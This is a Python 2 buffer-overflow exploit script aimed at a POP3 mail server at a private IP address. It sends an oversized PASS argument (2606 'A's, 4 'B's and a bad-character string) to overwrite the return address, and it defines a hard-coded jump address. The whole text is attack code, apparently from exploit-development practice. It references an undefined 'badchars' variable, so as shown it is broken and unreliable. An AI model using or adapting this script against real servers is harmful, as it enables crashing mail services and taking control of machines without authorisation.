#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#5F4A358F
ret = "\x8F\x35\x4A\x5F"
buffer = 'A' * 2606 + 'B' * 4 + badchars
try:
        print "\nSending evil buffer..."
        s.connect(('11.11.11.9',110))
        data = s.recv(1024)
        s.send('USER username' +'\r\n')
        data = s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        print "\nDone!."
except:
        print "Could not connect to POP3!"



